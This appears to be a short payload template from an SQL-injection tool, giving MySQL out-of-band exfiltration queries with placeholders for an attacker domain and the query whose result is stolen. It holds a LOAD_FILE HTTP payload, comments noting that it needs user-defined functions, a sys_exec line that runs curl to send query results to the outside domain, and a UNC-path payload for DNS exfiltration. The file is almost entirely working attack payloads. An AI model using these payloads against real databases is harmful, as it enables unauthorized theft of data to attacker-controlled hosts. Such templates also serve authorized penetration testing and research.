SELECT LOAD_FILE(CONCAT('http://%DOMAIN%/%PREFIX%.',(%QUERY%),'.%SUFFIX%'))
# Note: MySQL does not natively support HTTP requests from SQL.
# LOAD_FILE only supports local file paths (not HTTP URLs).
# HTTP OOB for MySQL typically requires:
#   1. User-Defined Functions (UDF) - e.g. lib_mysqludf_sys
#   2. sys_exec() or sys_eval() with curl: SELECT sys_exec(CONCAT('curl http://%DOMAIN%/%PREFIX%.',(%QUERY%),'.%SUFFIX%'))
#   3. DNS exfiltration is preferred for MySQL (use --dns-domain instead)
# For DNS exfiltration, use: SELECT LOAD_FILE(CONCAT('\\\\%PREFIX%.',(%QUERY%),'.%SUFFIX%.%DOMAIN%\\foo'))
